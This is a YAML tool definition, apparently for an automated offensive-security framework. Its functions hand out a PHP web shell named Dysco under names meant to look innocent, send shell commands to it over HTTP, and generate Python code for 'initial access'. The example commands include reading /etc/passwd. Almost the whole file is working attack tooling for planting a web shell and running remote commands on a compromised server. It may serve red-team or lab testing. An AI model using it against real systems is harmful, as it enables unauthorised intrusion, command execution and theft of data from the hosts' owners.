description: Produces web shells for PHP servers

functions:
  get_php_webshell_dysco_artifact:
    description: Return an PHP webshell initial access payload
    parameters:
      output_file:
        type: string
        required: true
        description: Output file name and extension
        examples:
          - 'dysco_webshell.php'
          - 'webshell.phtml'
          - 'dysco_php_webshell.php5'
    cmdline:
      - sh
      - -c
      - "cp '/data/web-shells/Dysco.php' '/data/web-shells/tmp/${output_file}' && echo '/data/web-shells/tmp/${output_file}'"


  call_php_webshell_dysco:
    description: Send a command to Dysco PHP shell
    parameters:
      target_url:
        type: string
        required: true
        description: The URL to the web shell
        examples:
          - 'http://127.0.0.1/shell.php'
          - 'https://localhost/uploads/evilshell'
      command:
        type: string
        required: true
        description: The command to run on the system hosting the webshell
        examples:
          - 'whoami'
          - 'cat /etc/passwd | grep root'
          - 'ipconfig /all'
    container:
      force: true
      preserve_app: true
      image: python:3.7-alpine
      args:
        - --net=host
      volumes:

    cmdline:
      - python
      - -c
      - |
        from urllib import (parse, request);
        url="${target_url}"
        cmd="${command}"
        response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
        print(response)

  get_php_webshell_dysco_initial_access_exploit:
    description: Generate Python Code for a Dysco Webshell Initial Access Payload
    parameters:
      target_url:
        type: string
        required: true
        description: The URL to the web shell
        examples:
          - 'http://127.0.0.1/shell.php'
          - 'https://target_host/uploads/webshell'
    cmdline:
      - echo
      - |
        from urllib import (parse, request);
        url="${target_url}"
        cmd="<command>"
        response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
        print(response)